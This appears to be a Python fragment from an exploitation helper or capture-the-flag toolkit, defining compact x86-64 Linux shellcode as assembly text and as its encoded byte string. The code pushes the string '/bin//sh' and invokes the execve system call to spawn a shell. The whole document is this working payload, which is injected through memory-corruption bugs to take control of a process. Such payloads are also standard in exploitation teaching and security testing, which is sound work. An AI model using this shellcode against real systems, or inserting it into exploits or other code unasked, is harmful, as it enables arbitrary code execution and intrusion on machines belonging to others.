shellcode_asm_amd64 = shellcode_asm_x86_64 = '''
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
'''

shellcode_amd64 = shellcode_x86_64 = b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'

